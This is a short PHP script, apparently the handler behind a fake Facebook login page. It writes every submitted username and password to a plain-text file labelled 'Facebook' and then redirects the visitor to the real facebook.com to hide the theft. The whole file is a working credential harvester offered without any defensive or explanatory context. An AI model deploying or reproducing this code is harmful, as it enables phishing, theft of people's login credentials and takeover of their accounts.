<?php

file_put_contents("usernames.txt", "Facebook :- username : " . $_POST['username'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();